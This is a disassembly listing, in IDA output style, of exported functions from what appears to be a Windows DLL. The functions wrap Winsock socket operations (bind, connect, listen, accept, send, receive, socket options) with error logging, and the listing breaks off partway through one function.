; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1119
Ordinal1119	proc near		; DATA XREF: .rdata:off_6AF66098o

WSAData		= WSAData ptr -194h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 194h
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		lea	eax, [ebp+WSAData]
		push	eax		; lpWSAData
		push	202h		; wVersionRequested
		call	ds:WSAStartup
		test	eax, eax
		jz	short loc_6AF4A085
		push	eax		; Args
		push	offset aCsocketStartup ; "CSocket::Startup() : WSAStartup() != 0,"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4A079:				; CODE XREF: Ordinal1119+47j
					; Ordinal1119+50j
		xor	eax, eax

loc_6AF4A07B:				; CODE XREF: Ordinal1119+55j
		mov	ecx, [ebp+var_4]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF4A085:				; CODE XREF: Ordinal1119+25j
		cmp	byte ptr [ebp+WSAData.wVersion], 2
		jnz	short loc_6AF4A079
		cmp	byte ptr [ebp+WSAData.wVersion+1], 2
		jnz	short loc_6AF4A079
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4A07B
Ordinal1119	endp

; Exported entry 1120.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1120
Ordinal1120	proc near		; DATA XREF: .rdata:off_6AF66098o
		call	ds:WSACleanup
		test	eax, eax
		jz	short loc_6AF4A0BC
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketStart_0 ; "CSocket::Startup() : WSACleanup() != 0,"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4A0BC:				; CODE XREF: Ordinal1120+8j
		xor	eax, eax
		inc	eax
		retn
Ordinal1120	endp

; Exported entry 1125.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1125(struct sockaddr *name)
		public Ordinal1125
Ordinal1125	proc near		; CODE XREF: Ordinal1129+7p
					; Ordinal1126+5Bp
					; DATA XREF: ...

name		= dword	ptr  4

		push	esi
		push	10h		; namelen
		push	[esp+8+name]	; name
		mov	esi, ecx
		push	dword ptr [esi+4] ; s
		call	ds:bind
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A0F1
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketBindBin ; "CSocket::Bind() : bind() == SOCKET_ERRO"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A0F4
; ---------------------------------------------------------------------------

loc_6AF4A0F1:				; CODE XREF: Ordinal1125+15j
		xor	eax, eax
		inc	eax

loc_6AF4A0F4:				; CODE XREF: Ordinal1125+2Fj
		pop	esi
		retn	4
Ordinal1125	endp

; Exported entry 1127.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1127(struct sockaddr *name)
		public Ordinal1127
Ordinal1127	proc near		; CODE XREF: Ordinal1128+50p
					; DATA XREF: .rdata:off_6AF66098o

name		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		call	dword ptr [eax+8]
		xor	eax, eax
		push	eax		; lpGQOS
		push	eax		; lpSQOS
		push	eax		; lpCalleeData
		push	eax		; lpCallerData
		push	10h		; namelen
		push	[esp+18h+name]	; name
		push	dword ptr [esi+4] ; s
		call	ds:WSAConnect
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A134
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketConnect ; "CSocket::Connect() : WSAConnect() == SO"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A13E
; ---------------------------------------------------------------------------

loc_6AF4A134:				; CODE XREF: Ordinal1127+20j
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+4]
		xor	eax, eax
		inc	eax

loc_6AF4A13E:				; CODE XREF: Ordinal1127+3Aj
		pop	esi
		retn	4
Ordinal1127	endp

; Exported entry 1129.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1129(struct sockaddr *name)
		public Ordinal1129
Ordinal1129	proc near		; CODE XREF: Ordinal1130+5Bp
					; DATA XREF: .rdata:off_6AF66098o

name		= dword	ptr  4

		push	esi
		push	[esp+4+name]	; name
		mov	esi, ecx
		call	Ordinal1125
		test	eax, eax
		jnz	short loc_6AF4A15E
		push	offset aCsocketListenB ; "CSocket::Listen() : Bind() ==	FALSE\n"
		call	sub_6AF3102E
		jmp	short loc_6AF4A18D
; ---------------------------------------------------------------------------

loc_6AF4A15E:				; CODE XREF: Ordinal1129+Ej
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		push	7FFFFFFFh	; backlog
		push	dword ptr [esi+4] ; s
		call	ds:listen
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A192
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketListenL ; "CSocket::Listen() : listen() == SOCKET_"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF4A18D:				; CODE XREF: Ordinal1129+1Aj
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A19C
; ---------------------------------------------------------------------------

loc_6AF4A192:				; CODE XREF: Ordinal1129+34j
		mov	eax, [esi]
		mov	ecx, esi
		call	dword ptr [eax+4]
		xor	eax, eax
		inc	eax

loc_6AF4A19C:				; CODE XREF: Ordinal1129+4Ej
		pop	esi
		retn	4
Ordinal1129	endp

; Exported entry 1131.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1131
Ordinal1131	proc near		; DATA XREF: .rdata:off_6AF66098o

addrlen		= dword	ptr -18h
Dst		= byte ptr -14h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 18h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		push	10h
		pop	edi
		push	edi		; Size
		mov	[ebp+var_4], eax
		lea	eax, [ebp+Dst]
		push	0		; Val
		push	eax		; Dst
		mov	esi, ecx
		call	memset
		add	esp, 0Ch
		push	0		; dwCallbackData
		push	0		; lpfnCondition
		lea	eax, [ebp+addrlen]
		push	eax		; addrlen
		lea	eax, [ebp+Dst]
		push	eax		; addr
		push	dword ptr [esi+4] ; s
		mov	[ebp+addrlen], edi
		call	ds:WSAAccept
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_6AF4A200
		call	ds:WSAGetLastError
		cmp	eax, 2733h
		mov	[esi+0Ch], eax
		jz	short loc_6AF4A200
		push	eax		; Args
		push	offset aCsocketAcceptW ; "CSocket::Accept() : WSAAccept() == INVA"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4A200:				; CODE XREF: Ordinal1131+41j
					; Ordinal1131+51j
		mov	ecx, [ebp+var_4]
		mov	eax, edi
		pop	edi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
Ordinal1131	endp

; Exported entry 1132.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1132(int, int, LPDWORD Flags)
		public Ordinal1132
Ordinal1132	proc near		; DATA XREF: .rdata:off_6AF66098o

Buffers		= _WSABUF ptr -8
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
Flags		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	edx, [ebp+arg_0]
		push	esi
		xor	eax, eax
		cmp	edx, eax
		push	edi
		mov	edi, [ebp+Flags]
		mov	esi, ecx
		mov	[edi], eax
		jz	short loc_6AF4A273
		mov	ecx, [ebp+arg_4]
		cmp	ecx, eax
		jz	short loc_6AF4A273
		push	eax		; lpCompletionRoutine
		push	eax		; lpOverlapped
		mov	[ebp+Flags], eax
		lea	eax, [ebp+Flags]
		push	eax		; lpFlags
		push	edi		; lpNumberOfBytesRecvd
		push	1		; dwBufferCount
		lea	eax, [ebp+Buffers]
		push	eax		; lpBuffers
		push	dword ptr [esi+4] ; s
		mov	[ebp+Buffers.buf], edx
		mov	[ebp+Buffers.len], ecx
		call	ds:WSARecv
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A26E
		call	ds:WSAGetLastError
		cmp	eax, 2733h
		mov	[esi+0Ch], eax
		jz	short loc_6AF4A26E
		push	eax		; Args
		push	offset aCsocketReadWsa ; "CSocket::Read() : WSARecv() == SOCKET_E"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4A27D
; ---------------------------------------------------------------------------

loc_6AF4A26E:				; CODE XREF: Ordinal1132+40j
					; Ordinal1132+50j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4A280
; ---------------------------------------------------------------------------

loc_6AF4A273:				; CODE XREF: Ordinal1132+15j
					; Ordinal1132+1Cj
		push	offset aCsocketReadPda ; "CSocket::Read() : pData == NULL\n"
		call	sub_6AF3102E

loc_6AF4A27D:				; CODE XREF: Ordinal1132+5Ej
		pop	ecx
		xor	eax, eax

loc_6AF4A280:				; CODE XREF: Ordinal1132+63j
		pop	edi
		pop	esi
		leave
		retn	0Ch
Ordinal1132	endp

; Exported entry 1133.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1133(DWORD dwFlags, int,	LPDWORD	lpNumberOfBytesSent)
		public Ordinal1133
Ordinal1133	proc near		; DATA XREF: .rdata:off_6AF66098o

Dst		= byte ptr -24h
var_14		= dword	ptr -14h
Buffers		= _WSABUF ptr -10h
var_8		= byte ptr -8
dwFlags		= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpNumberOfBytesSent= dword ptr	10h

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		mov	ebx, [ebp+lpNumberOfBytesSent]
		push	esi
		push	edi
		mov	esi, ecx
		mov	ecx, [ebp+dwFlags]
		xor	edi, edi
		cmp	ecx, edi
		mov	[ebx], edi
		jz	loc_6AF4A3A7
		mov	eax, [ebp+arg_4]
		cmp	eax, edi
		jz	loc_6AF4A3A7
		cmp	[esi+8], edi
		mov	[ebp+Buffers.buf], ecx
		mov	[ebp+Buffers.len], eax
		jz	loc_6AF4A378
		push	14h		; Size
		lea	eax, [ebp+Dst]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	ecx, [ebp+var_8]
		call	Ordinal1313
		push	edi		; int
		push	edi		; lpString2
		push	edi		; bInitialState
		push	1		; bManualReset
		push	edi		; lpEventAttributes
		lea	ecx, [ebp+var_8]
		call	Ordinal1317
		test	eax, eax
		jnz	short loc_6AF4A2F2
		push	offset aCsocketWriteHe ; "CSocket::Write() : hEvent.Create() ==	F"...
		call	sub_6AF3102E
		jmp	short loc_6AF4A360
; ---------------------------------------------------------------------------

loc_6AF4A2F2:				; CODE XREF: Ordinal1133+5Ej
		lea	ecx, [ebp+var_8]
		call	Ordinal1118
		push	edi		; lpCompletionRoutine
		mov	[ebp+var_14], eax
		lea	eax, [ebp+Dst]
		push	eax		; lpOverlapped
		push	edi		; dwFlags
		push	ebx		; lpNumberOfBytesSent
		push	1		; dwBufferCount
		lea	eax, [ebp+Buffers]
		push	eax		; lpBuffers
		push	dword ptr [esi+4] ; s
		call	ds:WSASend
		cmp	eax, 0FFFFFFFFh
		mov	ebx, ds:WSAGetLastError
		jnz	short loc_6AF4A332
		call	ebx ; WSAGetLastError
		cmp	eax, 3E5h
		mov	[esi+0Ch], eax
		jz	short loc_6AF4A332
		push	eax
		push	offset aCsocketWriteWs ; "CSocket::Write() : WSASend() == SOCKET_"...
		jmp	short loc_6AF4A35A
; ---------------------------------------------------------------------------

loc_6AF4A332:				; CODE XREF: Ordinal1133+96j
					; Ordinal1133+A2j
		lea	eax, [ebp+dwFlags]
		push	eax		; lpdwFlags
		push	1		; fWait
		push	[ebp+lpNumberOfBytesSent] ; lpcbTransfer
		lea	eax, [ebp+Dst]
		push	eax		; lpOverlapped
		push	dword ptr [esi+4] ; s
		mov	[ebp+dwFlags], edi
		call	ds:WSAGetOverlappedResult
		test	eax, eax
		jnz	short loc_6AF4A36B
		call	ebx ; WSAGetLastError
		push	eax		; Args
		mov	[esi+0Ch], eax
		push	offset aCsocketWrite_0 ; "CSocket::Write() : WSAGetOverlappedResu"...

loc_6AF4A35A:				; CODE XREF: Ordinal1133+AAj
		call	sub_6AF3102E
		pop	ecx

loc_6AF4A360:				; CODE XREF: Ordinal1133+6Aj
		pop	ecx
		lea	ecx, [ebp+var_8]
		call	Ordinal1315
		jmp	short loc_6AF4A3B2
; ---------------------------------------------------------------------------

loc_6AF4A36B:				; CODE XREF: Ordinal1133+C7j
		lea	ecx, [ebp+var_8]
		call	Ordinal1315

loc_6AF4A373:				; CODE XREF: Ordinal1133+108j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4A3B4
; ---------------------------------------------------------------------------

loc_6AF4A378:				; CODE XREF: Ordinal1133+31j
		push	edi		; lpCompletionRoutine
		push	edi		; lpOverlapped
		push	edi		; dwFlags
		push	ebx		; lpNumberOfBytesSent
		push	1		; dwBufferCount
		lea	eax, [ebp+Buffers]
		push	eax		; lpBuffers
		push	dword ptr [esi+4] ; s
		call	ds:WSASend
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A373
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketWriteWs ; "CSocket::Write() : WSASend() == SOCKET_"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4A3B1
; ---------------------------------------------------------------------------

loc_6AF4A3A7:				; CODE XREF: Ordinal1133+17j
					; Ordinal1133+22j
		push	offset aCsocketWritePd ; "CSocket::Write() : pData == NULL\n"
		call	sub_6AF3102E

loc_6AF4A3B1:				; CODE XREF: Ordinal1133+11Fj
		pop	ecx

loc_6AF4A3B2:				; CODE XREF: Ordinal1133+E3j
		xor	eax, eax

loc_6AF4A3B4:				; CODE XREF: Ordinal1133+F0j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal1133	endp

; Exported entry 1134.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1134
Ordinal1134	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		cmp	[esp+arg_0], 0
		push	esi
		mov	esi, ecx
		jz	short loc_6AF4A3D2
		mov	eax, [esp+4+arg_4]
		neg	eax
		sbb	eax, eax
		and	eax, 2
		jmp	short loc_6AF4A3DC
; ---------------------------------------------------------------------------

loc_6AF4A3D2:				; CODE XREF: Ordinal1134+8j
		xor	eax, eax
		inc	eax
		cmp	[esp+4+arg_4], 0
		jz	short loc_6AF4A408

loc_6AF4A3DC:				; CODE XREF: Ordinal1134+15j
		push	eax		; how
		push	dword ptr [esi+4] ; s
		call	ds:shutdown
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A405
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketShutdow ; "CSocket::Shutdown() :	shutdown() == SOC"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A408
; ---------------------------------------------------------------------------

loc_6AF4A405:				; CODE XREF: Ordinal1134+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4A408:				; CODE XREF: Ordinal1134+1Fj
					; Ordinal1134+48j
		pop	esi
		retn	8
Ordinal1134	endp

; Exported entry 1135.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1135
Ordinal1135	proc near		; CODE XREF: Ordinal1115+8p
					; Ordinal1121+5p ...

optval		= byte ptr -4
var_2		= word ptr -2
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		xor	ebx, ebx
		inc	ebx
		cmp	eax, 0FFFFFFFFh
		jz	short loc_6AF4A497
		push	edi
		push	eax		; hFile
		call	ds:CancelIo
		and	[ebp+var_2], 0
		xor	eax, eax
		cmp	[ebp+arg_0], eax
		push	4		; optlen
		setz	al
		mov	word ptr [ebp+optval], ax
		lea	eax, [ebp+optval]
		push	eax		; optval
		push	80h		; optname
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		call	ds:setsockopt
		cmp	eax, 0FFFFFFFFh
		mov	edi, ds:WSAGetLastError
		jnz	short loc_6AF4A470
		call	edi ; WSAGetLastError
		push	eax		; Args
		push	offset aCsocketCloseSe ; "CSocket::Close() : setsockopt() == SOCK"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	ebx, ebx

loc_6AF4A470:				; CODE XREF: Ordinal1135+4Ej
		push	dword ptr [esi+4] ; s
		call	ds:closesocket
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A492
		call	edi ; WSAGetLastError
		push	eax		; Args
		push	offset aCsocketCloseCl ; "CSocket::Close() : closesocket() == SOC"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	ebx, ebx

loc_6AF4A492:				; CODE XREF: Ordinal1135+70j
		or	dword ptr [esi+4], 0FFFFFFFFh
		pop	edi

loc_6AF4A497:				; CODE XREF: Ordinal1135+11j
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	4
Ordinal1135	endp

; Exported entry 1138.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1138
Ordinal1138	proc near		; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr -8
optval		= byte ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	dword ptr [ebp+optval],	0
		push	esi
		lea	eax, [ebp+optlen]
		push	eax		; optlen
		lea	eax, [ebp+optval]
		push	eax		; optval
		push	2		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		mov	[ebp+optlen], 4
		call	ds:getsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A4E9
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketIsliste ; "CSocket::IsListening() : getsockopt()	="...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A4EC
; ---------------------------------------------------------------------------

loc_6AF4A4E9:				; CODE XREF: Ordinal1138+2Ej
		mov	eax, dword ptr [ebp+optval]

loc_6AF4A4EC:				; CODE XREF: Ordinal1138+48j
		pop	esi
		leave
		retn
Ordinal1138	endp

; Exported entry 1139.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1139(u_long argp)
		public Ordinal1139
Ordinal1139	proc near		; DATA XREF: .rdata:off_6AF66098o

argp		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	edi, [ebp+argp]
		and	dword ptr [edi], 0
		and	[ebp+argp], 0
		lea	eax, [ebp+argp]
		push	eax		; argp
		mov	esi, ecx
		push	4004667Fh	; cmd
		push	dword ptr [esi+4] ; s
		call	ds:ioctlsocket
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A531
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCeventsocketGe ; "CEventSocket::GetReadPending() : ioctls"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A539
; ---------------------------------------------------------------------------

loc_6AF4A531:				; CODE XREF: Ordinal1139+26j
		mov	eax, [ebp+argp]
		mov	[edi], eax
		xor	eax, eax
		inc	eax

loc_6AF4A539:				; CODE XREF: Ordinal1139+40j
		pop	edi
		pop	esi
		pop	ebp
		retn	4
Ordinal1139	endp

; Exported entry 1140.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1140(u_long argp)
		public Ordinal1140
Ordinal1140	proc near		; DATA XREF: .rdata:off_6AF66098o

argp		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		xor	eax, eax
		cmp	[ebp+argp], eax
		push	esi
		setz	al
		mov	esi, ecx
		mov	[ebp+argp], eax
		lea	eax, [ebp+argp]
		push	eax		; argp
		push	8004667Eh	; cmd
		push	dword ptr [esi+4] ; s
		call	ds:ioctlsocket
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A581
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCeventsocketSe ; "CEventSocket::SetBlocking() :	ioctlsock"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A584
; ---------------------------------------------------------------------------

loc_6AF4A581:				; CODE XREF: Ordinal1140+26j
		xor	eax, eax
		inc	eax

loc_6AF4A584:				; CODE XREF: Ordinal1140+40j
		pop	esi
		pop	ebp
		retn	4
Ordinal1140	endp

; Exported entry 1142.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1142(char optval)
		public Ordinal1142
Ordinal1142	proc near		; CODE XREF: Ordinal1141+7p
					; DATA XREF: .rdata:off_6AF66098o

optval		= byte ptr  4

		push	esi
		push	4		; optlen
		lea	eax, [esp+8+optval]
		push	eax		; optval
		push	1001h		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		call	ds:setsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A5C5
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketSetwrit ; "CSocket::SetWriteBufferSize()	: setsock"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A5C8
; ---------------------------------------------------------------------------

loc_6AF4A5C5:				; CODE XREF: Ordinal1142+20j
		xor	eax, eax
		inc	eax

loc_6AF4A5C8:				; CODE XREF: Ordinal1142+3Aj
		pop	esi
		retn	4
Ordinal1142	endp

; Exported entry 1143.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1143(char optval)
		public Ordinal1143
Ordinal1143	proc near		; CODE XREF: Ordinal1141+16p
					; DATA XREF: .rdata:off_6AF66098o

optval		= byte ptr  4

		push	esi
		push	4		; optlen
		lea	eax, [esp+8+optval]
		push	eax		; optval
		push	1002h		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		call	ds:setsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A608
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketSetread ; "CSocket::SetReadBufferSize() : setsocko"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A60B
; ---------------------------------------------------------------------------

loc_6AF4A608:				; CODE XREF: Ordinal1143+20j
		xor	eax, eax
		inc	eax

loc_6AF4A60B:				; CODE XREF: Ordinal1143+3Aj
		pop	esi
		retn	4
Ordinal1143	endp

; Exported entry 1145.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1145(char *optlen)
		public Ordinal1145
Ordinal1145	proc near		; CODE XREF: Ordinal1144+13p
					; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+optlen]
		and	dword ptr [eax], 0
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+optlen]
		push	ecx		; optlen
		push	eax		; optval
		push	1001h		; optname
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		mov	[ebp+optlen], 4
		call	ds:getsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A659
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetwrit ; "CSocket::GetWriteBufferSize()	: getsock"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A65C
; ---------------------------------------------------------------------------

loc_6AF4A659:				; CODE XREF: Ordinal1145+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4A65C:				; CODE XREF: Ordinal1145+48j
		pop	esi
		pop	ebp
		retn	4
Ordinal1145	endp

; Exported entry 1146.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1146(char *optlen)
		public Ordinal1146
Ordinal1146	proc near		; CODE XREF: Ordinal1144+1Fp
					; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+optlen]
		and	dword ptr [eax], 0
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+optlen]
		push	ecx		; optlen
		push	eax		; optval
		push	1002h		; optname
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		mov	[ebp+optlen], 4
		call	ds:getsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A6AB
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetread ; "CSocket::GetReadBufferSize() : getsocko"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A6AE
; ---------------------------------------------------------------------------

loc_6AF4A6AB:				; CODE XREF: Ordinal1146+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4A6AE:				; CODE XREF: Ordinal1146+48j
		pop	esi
		pop	ebp
		retn	4
Ordinal1146	endp

; Exported entry 1148.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1148(char optval)
		public Ordinal1148
Ordinal1148	proc near		; CODE XREF: Ordinal1147+16p
					; DATA XREF: .rdata:off_6AF66098o

optval		= byte ptr  4

		push	esi
		push	4		; optlen
		lea	eax, [esp+8+optval]
		push	eax		; optval
		push	1006h		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		call	ds:setsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A6EF
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketSetre_0 ; "CSocket::SetReadTimeout() : setsockopt("...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A6F2
; ---------------------------------------------------------------------------

loc_6AF4A6EF:				; CODE XREF: Ordinal1148+20j
		xor	eax, eax
		inc	eax

loc_6AF4A6F2:				; CODE XREF: Ordinal1148+3Aj
		pop	esi
		retn	4
Ordinal1148	endp

; Exported entry 1149.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1149(char optval)
		public Ordinal1149
Ordinal1149	proc near		; CODE XREF: Ordinal1147+7p
					; DATA XREF: .rdata:off_6AF66098o

optval		= byte ptr  4

		push	esi
		push	4		; optlen
		lea	eax, [esp+8+optval]
		push	eax		; optval
		push	1005h		; optname
		mov	esi, ecx
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		call	ds:setsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A732
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketSetwr_0 ; "CSocket::SetWriteTimeout() : setsockopt"...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A735
; ---------------------------------------------------------------------------

loc_6AF4A732:				; CODE XREF: Ordinal1149+20j
		xor	eax, eax
		inc	eax

loc_6AF4A735:				; CODE XREF: Ordinal1149+3Aj
		pop	esi
		retn	4
Ordinal1149	endp

; Exported entry 1151.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1151(char *optlen)
		public Ordinal1151
Ordinal1151	proc near		; CODE XREF: Ordinal1150+1Fp
					; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+optlen]
		and	dword ptr [eax], 0
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+optlen]
		push	ecx		; optlen
		push	eax		; optval
		push	1006h		; optname
		push	0FFFFh		; level
		push	dword ptr [esi+4] ; s
		mov	[ebp+optlen], 4
		call	ds:getsockopt
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF4A783
		call	ds:WSAGetLastError
		push	eax		; Args
		push	offset aCsocketGetre_0 ; "CSocket::GetReadTimeout() : getsockopt("...
		mov	[esi+0Ch], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4A786
; ---------------------------------------------------------------------------

loc_6AF4A783:				; CODE XREF: Ordinal1151+2Ej
		xor	eax, eax
		inc	eax

loc_6AF4A786:				; CODE XREF: Ordinal1151+48j
		pop	esi
		pop	ebp
		retn	4
Ordinal1151	endp

; Exported entry 1152.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1152(char *optlen)
		public Ordinal1152
Ordinal1152	proc near		; CODE XREF: Ordinal1150+13p
					; DATA XREF: .rdata:off_6AF66098o

optlen		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+optlen]
		and	dword ptr [eax], 0
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+optlen]
		push	ecx		; optlen
		push	eax		; optval
		push	1005h		; optname
		push	0FFFFh		; level
